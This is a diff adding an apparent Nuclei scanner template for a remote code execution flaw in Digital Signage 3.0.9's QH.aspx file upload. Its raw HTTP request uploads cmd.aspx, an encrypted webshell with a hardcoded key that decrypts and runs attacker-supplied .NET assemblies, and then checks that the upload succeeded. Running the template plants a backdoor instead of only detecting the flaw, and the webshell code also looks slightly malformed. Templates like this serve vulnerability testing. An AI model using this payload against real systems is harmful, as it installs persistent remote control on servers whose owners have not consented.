@@ -1,0 +1,63 @@
+id: Digital-Signage-rce
+info:
+  author: Str1am
+  name: "Digital Signage 3.0.9 \u7248\u672C QH.aspx \u6587\u4EF6 \u8FDC\u7A0B\u4EE3\
+    \u7801\u6267\u884C\u6F0F\u6D1E"
+  reference: https://www.zeroscience.mk/codes/qhsignage_rce.txt
+  severity: critical
+  tags: Digital,rce
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - cmd.aspx
+    - 'true'
+  matchers-condition: and
+  raw:
+  - 'POST /QH.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhbcZX7o0Hw19h3kr
+
+
+    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+
+    Content-Disposition: form-data; name="fileToUpload"; filename="cmd.aspx"
+
+    Content-Type: application/octet-stream
+
+
+    <%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");  Encoding.Default.GetBytes(Session[0]
+    + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k,
+    k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
+
+    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+
+    Content-Disposition: form-data; name="action"
+
+
+    upload
+
+    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+
+    Content-Disposition: form-data; name="responderId"
+
+
+    ResourceNewResponder
+
+    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr
+
+    Content-Disposition: form-data; name="remotePath"
+
+
+    /opt/resources
+
+    ------WebKitFormBoundaryhbcZX7o0Hw19h3kr--
+
+    '
